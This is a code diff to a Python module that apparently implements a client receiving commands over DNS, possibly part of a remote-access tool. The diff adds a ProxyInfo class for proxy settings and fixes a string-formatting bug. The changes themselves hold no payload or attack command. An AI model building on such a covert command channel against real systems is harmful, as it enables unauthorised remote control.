@@ -54,6 +54,36 @@ except ImportError:
 class DnsCommandClientDecodingError(Exception):
     pass
 
+class ProxyInfo(object):
+    __slots__ = (
+        'scheme', 'ip', 'port', 'user', 'password'
+    )
+
+    def __init__(self, scheme, ip, port, user, password):
+        scheme = scheme.upper()
+        if scheme == 'SOCKS':
+            scheme = 'SOCKS5'
+
+        self.scheme = scheme
+        self.ip = str(ip)
+        self.port = port
+        self.user = user
+        self.password = password
+
+    def as_tuple(self):
+        return self.scheme, self.ip+(
+            ':'+str(self.port) if self.port else ''
+        ), self.user, self.password
+
+    def __str__(self):
+        if self.user and self.password:
+            auth = '{}:{}@'.format(self.user, self.password)
+        else:
+            auth = ''
+
+        return '{}://{}{}:{}'.format(
+            self.scheme.lower(), auth, self.ip, self.port)
+
 class DnsCommandsClient(Thread):
     def __init__(self, domain, key, ns=None, qtype='A', ns_proto=socket.SOCK_DGRAM, ns_timeout=3):
         try:
@@ -390,12 +420,7 @@ class DnsCommandsClient(Thread):
         elif scheme.lower() == 'any':
             self.proxy = True
         else:
-            if user and password:
-                auth = '%s:%s@'.format(user, password)
-            else:
-                auth = ''
-
-            self.proxy = '%s://%s%s:%s'.format(scheme, auth, ip, port)
+            self.proxy = ProxyInfo(scheme, ip, port, user, password)
 
     def process(self):
         commands = []
